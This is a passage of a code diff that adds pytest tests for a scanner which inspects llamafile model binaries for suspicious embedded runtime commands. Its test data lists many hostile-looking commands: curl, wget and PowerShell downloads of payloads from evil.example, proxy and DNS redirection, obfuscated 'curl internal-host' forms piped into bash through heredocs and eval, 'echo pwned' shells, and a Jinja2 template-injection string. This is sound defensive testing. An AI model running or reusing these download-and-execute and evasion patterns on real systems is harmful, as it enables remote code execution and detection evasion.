+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert not any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in runtime_checks)
+
+
+def test_llamafile_interpreter_candidate_parsing_is_bounded() -> None:
+    runtime_text = "bash " * (LLAMAFILE_RUNTIME_MAX_INTERPRETER_CANDIDATES + 1)
+
+    _, _, _, _, interpreter_scan_limited = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert interpreter_scan_limited is True
+
+
+def test_llamafile_runtime_fragment_parsing_is_bounded() -> None:
+    runtime_text = "%'18t connect closed " * 65
+
+    _, _, token_scan_limited, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert token_scan_limited is True
+
+
+def test_llamafile_transfer_context_byte_limit_is_inconclusive(tmp_path: Path) -> None:
+    binary = tmp_path / "transfer-context-byte-limit.llamafile"
+    hidden_transfer = "A" * (LLAMAFILE_RUNTIME_MAX_TRANSFER_CONTEXT_BYTES + 1)
+    hidden_transfer += " curl internal-host"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[hidden_transfer]))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_TRANSFER_TOKEN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    assert not any(
+        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
+        for check in direct.checks
+    )
+
+
+def test_llamafile_interpreter_token_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    binary = tmp_path / "interpreter-token-limit.llamafile"
+    hidden_command = "python " + ("-B " * (LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS + 1))
+    hidden_command += "-c print('https://evil.example/payload')"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[hidden_command]))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_INTERPRETER_TOKEN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    coverage_checks = [
+        check for check in direct.checks if check.name == "Llamafile Runtime Interpreter Command Coverage"
+    ]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].message == "Runtime interpreter command exceeded the bounded argument analysis limit"
+    assert coverage_checks[0].details["max_tokens"] == LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "interpreter-token-limit-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        "python "
+        + ("-B " * (LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS - 1))
+        + "-c print('https://evil.example/payload')",
+        "bash " + ("-v " * (LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS - 1)) + "-c echo https://evil.example/payload",
+    ],
+)
+def test_llamafile_interpreter_token_boundary_is_inconclusive(tmp_path: Path, runtime_line: str) -> None:
+    binary = tmp_path / "interpreter-token-boundary.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.success is False
+    assert LLAMAFILE_RUNTIME_INTERPRETER_TOKEN_LIMIT_REASON in result.metadata["scan_outcome_reasons"]
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        "curl --future-option https://maybe.example",
+        "curl --future-option internal-host",
+        "curl -j internal-host",
+        "sudo --future curl internal-host",
+    ],
+)
+def test_llamafile_transfer_option_ambiguity_is_inconclusive_and_not_cached(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "transfer-option-ambiguity.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_TRANSFER_OPTION_AMBIGUOUS_REASON in direct.metadata["scan_outcome_reasons"]
+    coverage_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Transfer Option Analysis"]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].message == "Runtime transfer command used an option with ambiguous argument arity"
+    assert not any(
+        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
+        for check in direct.checks
+    )
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "transfer-option-ambiguity-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_utf16_ambiguity_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    binary = tmp_path / "utf16-ambiguity.llamafile"
+    ambiguous_runtime = b"\x01b" + "ash -c echo benignZ".encode("utf-16be") + b"\x01"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[ambiguous_runtime.decode("latin-1")]))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_UTF16_AMBIGUOUS_REASON in direct.metadata["scan_outcome_reasons"]
+    coverage_checks = [check for check in direct.checks if check.name == "Llamafile Runtime UTF-16 Analysis"]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].message == "Runtime bytes had conflicting UTF-16 byte-order interpretations"
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in direct.checks)
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "utf16-ambiguity-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_gguf_candidate_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    binary = tmp_path / "many-gguf-candidates.llamafile"
+    candidate = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
+    binary.write_bytes(_build_llamafile_blob(embedded_payload=candidate * LLAMAFILE_GGUF_MAX_HEADER_CANDIDATES))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_GGUF_CANDIDATE_SCAN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    coverage_checks = [
+        check for check in direct.checks if check.name == "Llamafile Embedded Payload Candidate Coverage"
+    ]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].message == ("Embedded GGUF candidate count exceeded the bounded structural probe limit")
+    assert coverage_checks[0].details["max_candidates"] == LLAMAFILE_GGUF_MAX_HEADER_CANDIDATES
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "gguf-candidate-limit-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_gguf_header_resource_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    binary = tmp_path / "gguf-header-resource-limit.llamafile"
+    over_limit_header = b"GGUF" + struct.pack("<IQQ", 3, 10_000_001, 0)
+    binary.write_bytes(_build_llamafile_blob(embedded_payload=over_limit_header))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_GGUF_HEADER_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    checks = [check for check in direct.checks if check.name == "Llamafile Embedded GGUF Header Resource Limits"]
+    assert len(checks) == 1
+    assert checks[0].message == "Embedded GGUF header declares resource counts above the structural probe limit"
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "gguf-header-resource-limit-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_truncated_gguf_header_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    binary = tmp_path / "truncated-gguf-header.llamafile"
+    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"GGUF"))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert LLAMAFILE_GGUF_HEADER_INCOMPLETE_REASON in direct.metadata["scan_outcome_reasons"]
+    checks = [check for check in direct.checks if check.name == "Llamafile Embedded GGUF Header Integrity"]
+    assert len(checks) == 1
+    assert checks[0].message == "Embedded GGUF marker is truncated before its complete header"
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "truncated-gguf-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+@pytest.mark.parametrize("version", [4, 10_001])
+def test_llamafile_scanner_preserves_findings_from_future_gguf_versions(tmp_path: Path, version: int) -> None:
+    binary = tmp_path / f"future-gguf-v{version}.llamafile"
+    malicious_payload = _build_gguf_string_metadata(
+        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")],
+        version=version,
+    )
+    _write_sparse_mapped_llamafile(binary, "elf", embedded_payload=malicious_payload)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert any(
+        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
 def test_llamafile_late_preview_failure_retains_observed_runtime_findings(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -852,6 +2594,91 @@ def test_llamafile_scanner_flags_suspicious_runtime_strings(tmp_path: Path) -> N
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
 
 
+@pytest.mark.parametrize("encoding", ["utf-16le", "utf-16be"])
+def test_llamafile_scanner_flags_utf16_runtime_commands(tmp_path: Path, encoding: str) -> None:
+    binary = tmp_path / f"suspicious-{encoding}.llamafile"
+    _write_sparse_mapped_llamafile(
+        binary,
+        "pe",
+        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
+        mapped_runtime="powershell Invoke-WebRequest https://evil.example/payload".encode(encoding),
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+
+
+@pytest.mark.parametrize("encoding", ["utf-16le", "utf-16be"])
+def test_llamafile_scanner_ignores_shifted_utf16_command_near_match(tmp_path: Path, encoding: str) -> None:
+    binary = tmp_path / f"benign-shifted-{encoding}.llamafile"
+    _write_sparse_mapped_llamafile(
+        binary,
+        "pe",
+        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
+        mapped_runtime="xbash -c echo benign".encode(encoding),
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_scanner_preserves_crossing_utf16be_command_candidate(tmp_path: Path) -> None:
+    binary = tmp_path / "crossing-utf16be-command.llamafile"
+    mapped_runtime = "abcdefgh".encode("utf-16be") + b"X" + "bash -c echo pwned".encode("utf-16be")
+    _write_sparse_mapped_llamafile(
+        binary,
+        "pe",
+        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
+        mapped_runtime=mapped_runtime,
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert len(runtime_checks) == 1
+    assert runtime_checks[0].severity == IssueSeverity.WARNING
+    assert "bash -c echo pwned" in repr(runtime_checks[0].details)
+
+
+def test_llamafile_scanner_ignores_crossing_utf16_phantom_command(tmp_path: Path) -> None:
+    binary = tmp_path / "crossing-utf16be-phantom.llamafile"
+    mapped_runtime = "abcdefgh".encode("utf-16be") + b"b" + "ash -c echo benignZ".encode("utf-16be")
+    _write_sparse_mapped_llamafile(
+        binary,
+        "pe",
+        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
+        mapped_runtime=mapped_runtime,
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_streaming_preserves_utf16_disambiguation_context(tmp_path: Path) -> None:
+    binary = tmp_path / "streamed-utf16be-phantom.llamafile"
+    prior = "abcdefgh".encode("utf-16be")
+    first_chunk = b"\x01" * (llamafile_scanner_module.LLAMAFILE_RUNTIME_STREAM_CHUNK_BYTES - len(prior) - 1)
+    first_chunk += prior + b"\x01"
+    binary.write_bytes(first_chunk + b"b" + "ash -c echo benignZ".encode("utf-16be") + b"\x01")
+    result = ScanResult("llamafile")
+
+    scanned, read_error, *_ = LlamafileScanner()._scan_runtime_strings_streaming(
+        binary,
+        binary.stat().st_size,
+        [],
+        result,
+        include_preview_fallback=False,
+    )
+
+    assert scanned == binary.stat().st_size
+    assert read_error is None
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
 def test_llamafile_scanner_redacts_sensitive_runtime_evidence(tmp_path: Path) -> None:
     binary = tmp_path / "sensitive-runtime.llamafile"
     binary.write_bytes(
@@ -878,12 +2705,567 @@ def test_llamafile_scanner_redacts_sensitive_runtime_evidence(tmp_path: Path) ->
     assert "<redacted>" in details
 
 
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        "curl --silent https://evil.example/payload.sh",
+        "wget --quiet evil.example/payload.sh",
+        'curl -H "X-Test: yes" https://evil.example/payload.sh',
+        "curl --retry 3 evil.example/payload.sh",
+        "curl -so output.bin evil.example/payload.sh",
+        "curl -sLo output.bin evil.example/payload.sh",
+        "curl -sSLo output.bin evil.example/payload.sh",
+        "wget -qO output.bin evil.example/payload.sh",
+        "wget --tries 3 evil.example/payload.sh",
+        "curl --interface eth0 evil.example/payload.sh",
+        "curl --upload-file payload.bin evil.example/payload.sh",
+        "wget --quota 1M evil.example/payload.sh",
+        "curl evil.xn--p1ai",
+        "wget evil.example.",
+        "curl --verbose evil.example/first http://localhost/second",
+        "wget --timestamping evil.example/first http://localhost/second",
+        "curl --proxy http://evil.example:8080 http://localhost/payload",
+        "curl --preproxy=socks5://evil.example:1080 http://localhost/payload",
+        "curl --proxy1.0 http://evil.example:8080 http://localhost/payload",
+        "curl -x http://evil.example:8080 http://localhost/payload",
+        "curl --connect-to localhost:80:evil.example:80 http://localhost/payload",
+        "curl --resolve localhost:80:8.8.8.8 http://localhost/payload",
+        "curl --doh-url https://evil.example/dns-query http://localhost/payload",
+        "curl --dns-servers 127.0.0.1,8.8.8.8 http://localhost/payload",
+        "wget -e https_proxy=http://evil http://127.0.0.1/payload",
+        "wget --execute=https_proxy=http://evil http://127.0.0.1/payload",
+        "curl internal-host",
+        "curl inter''nal-host",
+        r"curl internal\-host",
+        r"c\u\r\l internal-host",
+        'c""url internal-host',
+        "c'u'rl internal-host",
+        "cu'r'l internal-host",
+        "curl'.exe' internal-host",
+        "c'u'rl'.exe' internal-host",
+        "$'curl' internal-host",
+        '$"curl" internal-host',
+        'curl "internal-"host',
+        "curl user@evil.example",
+        "curl evil.example?x=1",
+        "/usr/bin/curl internal-host",
+        "bash -c 'curl internal-host'",
+        'bash -c "curl internal-host"',
+        "bash -c 'echo ok; curl internal-host'",
+        "bash -c 'true && curl internal-host'",
+        "bash -c '(curl internal-host)'",
+        "bash -c '{ curl internal-host; }'",
+        "bash -c '! curl internal-host'",
+        "bash -c 'if true; then curl internal-host; fi'",
+        "bash -c 'sudo /usr/bin/curl internal-host'",
+        "(curl internal-host)",
+        "{ curl internal-host; }",
+        "! curl internal-host",
+        "if true; then curl internal-host; fi",
+        "echo $(curl internal-host)",
+        "bash -c 'echo $(curl internal-host)'",
+        "bash -c 'echo `curl internal-host`'",
+        "bash -c 'echo \"$(curl internal-host)\"'",
+        "command env FOO=bar curl internal-host",
+        "time -p curl internal-host",
+        "/usr/bin/time -p curl internal-host",
+        "timeout 5 curl internal-host",
+        "nice -n 5 curl internal-host",
+        "setsid curl internal-host",
+        "stdbuf -o0 curl internal-host",
+        "xargs curl internal-host",
+        "find . -exec curl internal-host \\;",
+        "find . -exec curl internal-host '{}' +",
+        "find . -exec curl internal-host {} \\+",
+        "find . -exec curl internal-host {} '+'",
+        "find . -exec curl internal-host \\{\\} +",
+        "watch curl internal-host",
+        "busybox curl internal-host",
+        "parallel curl internal-host",
+        "strace curl internal-host",
+        "ionice curl internal-host",
+        "taskset 0x1 curl internal-host",
+        "chroot /sandbox curl internal-host",
+        "doas curl internal-host",
+        "runuser -u user -- curl internal-host",
+        "eval 'curl internal-host'",
+        "builtin exec curl internal-host",
+        "f(){ curl internal-host; }; f",
+        "subprocess.run(['curl', 'internal-host'])",
+        "subprocess.run('curl internal-host', shell=True)",
+        "echo ignored | echo 'curl internal-host' | bash",
+        "printf ignored | printf 'curl internal-host' | bash",
+        "echo ignored | printf '%s %s' curl internal-host | bash",
+        "printf '%b' 'curl\\x20internal-host' | bash",
+        "printf '%b' 'curl\\040internal-host' | bash",
+        "echo -e 'curl\\tinternal-host' | bash",
+        "bash <<< 'curl internal-host'; :",
+        "bash <<< 'curl internal-host' && echo ok",
+        "bash <<< 'curl internal-host' | cat",
+        "bash <<< 'curl internal-host' >out",
+        "bash >out <<< 'curl internal-host'",
+        "bash 2>/dev/null <<< 'curl internal-host'",
+        "<input bash <<< 'curl internal-host'",
+        "echo 'curl internal-host' | bash >out",
+        "echo 'curl internal-host' | bash 2>/dev/null",
+        "echo 'curl internal-host' 3>out | bash",
+        "echo 'curl internal-host' 0>in | bash",
+        "echo 'curl internal-host' 10>out | bash",
+        "echo 'curl internal-host' {fd}>out | bash",
+        "echo 'curl internal-host' |& bash",
+        "echo $(f(){ curl internal-host; }; f)",
+        'echo "$(f(){ curl internal-host; }; f)"',
+        "2>/dev/null curl internal-host",
+        "2>&1 curl internal-host",
+        ">&2 curl internal-host",
+        "<&0 curl internal-host",
+        "2>&- curl internal-host",
+        "2>|out curl internal-host",
+        ">out curl internal-host",
+        "<input curl internal-host",
+        "VAR=x 2>/dev/null curl internal-host",
+        "bash -c '2>/dev/null curl internal-host'",
+        r"echo `echo \`curl internal-host\``",
+        "echo curl; curl internal-host",
+        "FOO=curl curl internal-host",
+        "echo $(echo curl; curl internal-host)",
+        "case x in x) curl internal-host;; esac",
+        "case x in x|y) curl internal-host;; esac",
+        "coproc curl internal-host",
+        "coproc JOB { curl internal-host; }",
+        "time FOO=bar curl internal-host",
+        "env --split-string='curl internal-host'",
+        "env --split-string='FOO=bar curl internal-host'",
+        "env --split-string='env FOO=bar curl internal-host'",
+        'echo "$(curl internal-host)"',
+        "cat <<EOF\n$(curl internal-host)\nEOF",
+        "cat <<'EOF'\0curl internal-host\0EOF",
+        "bash <<'EOF'\ncurl internal-host\nEOF",
+        "/bin/sh <<'EOF'\nwget internal-host\nEOF",
+        "bash -s <<'EOF'\ncurl internal-host\nEOF",
+        "cat <<'EOF' | bash\ncurl internal-host\nEOF",
+        "tee output <<'EOF' | sh\nwget internal-host\nEOF",
+        "cat <<'EOF' > >(bash)\ncurl internal-host\nEOF",
+        "cat <<'EOF' | python\nimport os; os.system('curl internal-host')\nEOF",
+        "cat <<'EOF' > >(python)\nimport os; os.system('curl internal-host')\nEOF",
+        "cat <<'EOF' >payload\ncurl internal-host\nEOF\nbash payload",
+        "tee payload <<'EOF'\ncurl internal-host\nEOF\nsh payload",
+        "sort -o payload <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sort -opayload <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sort --output=payload <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "uniq - payload <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sed -n 'w payload' <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sed 's/.*/&/w payload' <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sed -n '1w payload' <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sed(){ bash; }; sed -n p <<'EOF'\ncurl internal-host\nEOF",
+        "sort(){ bash; }; sort <<'EOF'\ncurl internal-host\nEOF",
+        "sed(){ bash; }\nsed -n p <<'EOF'\ncurl internal-host\nEOF",
+        "shopt -s expand_aliases\nalias sort=bash\nsort <<'EOF'\ncurl internal-host\nEOF",
+        "bash <<< 'curl internal-host'",
+        "bash /dev/stdin <<< 'curl internal-host'",
+        "bash - <<< 'curl internal-host'",
+        "bash --login <<< 'curl internal-host'",
+        "echo 'curl internal-host' | bash /dev/stdin",
+        "sh <<<'wget internal-host'",
+        "bash -s -- foo <<< 'curl internal-host'",
+        "sh -s foo <<<'wget internal-host'",
+        "bash <<< $'curl internal-host'",
+        "bash <<< curl\\ internal-host",
+        "bash <<< 'curl 'internal-host",
+        "printf 'curl internal-host' | bash",
+        "echo 'curl internal-host' | sh",
+        "printf 'curl %s\\n' internal-host | bash",
+        "printf '%s %s\\n' curl internal-host | bash",
+        "printf 'curl internal-host %s' | bash",
+        "printf '%s curl internal-host' | bash",
+        "curl \\\ninternal-host",
+        "curl --silent \\\ninternal-host",
+        "wget --quiet \\\ninternal-host",
+        "curl 8.8",
+        "curl 8.8.8",
+        "curl 010.010.010.010",
+        "echo \"<<'EOF'\"\ncurl internal-host\nEOF",
+        "# <<'EOF'\ncurl internal-host\nEOF",
+        "bash -c $'curl internal-host'",
+        'cmd.exe /c "echo ok & curl internal-host"',
+        "cmd.exe /s /c curl internal-host",
+        "sudo curl internal-host",
+        "sudo -n curl internal-host",
+        "sudo --non-interactive curl internal-host",
+        "env curl internal-host",
+        "env -i curl internal-host",
+        "nohup -- curl internal-host",
+        "/usr/bin/wget evil.example/payload.sh",
+        '"curl" https://evil.example/payload.sh',
+        '"/usr/bin/curl" https://evil.example/payload.sh',
+        "curl.exe 8.8.8.8:8080",
+        "powershell Invoke-WebRequest https://evil.example/payload.sh",
+        "cmd.exe /s /c curl https://evil.example/payload.sh",
+    ],
+)
+def test_llamafile_scanner_flags_remote_transfer_after_long_options(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "remote-transfer-long-option.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        "bash -l -c echo pwned",
+        "bash --noprofile -c echo pwned",
+        "bash --debugger -c echo pwned",
+        "bash --debug -c echo pwned",
+        "bash --verbose -c echo pwned",
+        "bash -l -c 'echo -o noexec pwned'",
+        "bash --rcfile '-o noexec' -c echo pwned",
+        "bash -n +n -c echo pwned",
+        "sh -o nounset -c echo pwned",
+        "zsh --no-rcs -c echo pwned",
+        "zsh --no-globalrcs -c echo pwned",
+        "zsh --emacs -c echo pwned",
+        "zsh --privileged -c echo pwned",
+        "zsh --shinstdin -c echo pwned",
+        "zsh --singlecommand -c echo pwned",
+        "zsh --interactivecomments -c echo pwned",
+        "zsh -n --exec -c echo pwned",
+        r"bash \-c echo pwned",
+        r"zsh \-c echo pwned",
+        "python -I -c print(1)",
+        "python -b -c print(1)",
+        "python -bb -c print(1)",
+        "python -bI -c print(1)",
+        "python -IB -c print(1)",
+        "python -uB -c print(1)",
+        "python -bbb -c print(1)",
+        "python -OOOO -c print(1)",
+        "python -vvvv -c print(1)",
+        "python -bc print(1)",
+        "python -bIc print(1)",
+        "python -bcprint(1)",
+        "python -bIcprint(1)",
+        "python -bbbcprint(1)",
+        "python -OOOOcprint(1)",
+        "python -vvvvcprint(1)",
+        "python3.11 -X dev -c print(1)",
+        '"/bin/bash" -c echo pwned',
+        '"python3" -c print(1)',
+        '"cmd.exe" /c whoami',
+        '"C:\\Program Files\\Tools\\cmd.exe" /c whoami',
+        "cmd.exe /v:on /c whoami",
+        '"powershell.exe" Invoke-Expression whoami',
+        '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" Invoke-Expression whoami',
+    ],
+)
+def test_llamafile_scanner_flags_interpreter_commands_after_options(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "interpreter-options.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert len(runtime_checks) == 1
+    assert runtime_checks[0].severity == IssueSeverity.WARNING
+
+
+def test_llamafile_scanner_correlates_inline_python_command_with_network(tmp_path: Path) -> None:
+    binary = tmp_path / "inline-python-network.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=["python -bcprint('https://evil.example/payload')"]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert len(runtime_checks) == 1
+    assert runtime_checks[0].severity == IssueSeverity.CRITICAL
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        "python script.py -c print(1)",
+        "python -m package -c print(1)",
+        "bash -- -c echo benign",
+        "bash --help -c echo benign",
+        "zsh --help -c echo benign",
+        r"""bash "\-c" echo benign""",
+        "xbash -l -c echo benign",
+    ],
+)
+def test_llamafile_scanner_ignores_non_command_interpreter_near_matches(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "interpreter-near-match.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        '"notpowershell" -Help https://docs.example/guide',
+        '"documentation about powershell" -Help https://docs.example/guide',
+        '"Curl","CurlyDoubleQuote","https://docs.example/guide"',
+        "bash -C https://docs.example/guide",
+        "python -C https://docs.example/guide",
+        "python -V -c https://docs.example/guide",
+        "python -VV -c https://docs.example/guide",
+        "python -h -c https://docs.example/guide",
+        "bash -n -c echo https://docs.example/guide",
+        "bash -D -c echo https://docs.example/guide",
+        "bash -D +D -c echo https://docs.example/guide",
+        "zsh --noexec -c echo https://docs.example/guide",
+        "bash -o noexec -c echo https://docs.example/guide",
+        "bash - foo -c echo https://docs.example/guide",
+        "bash + foo -c echo https://docs.example/guide",
+    ],
+)
+def test_llamafile_scanner_does_not_correlate_command_near_matches(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "command-near-match.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert runtime_checks
+    assert all(check.severity == IssueSeverity.INFO for check in runtime_checks)
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        "bash -c echo curl internal-host",
+        "cmd.exe /c echo curl internal-host",
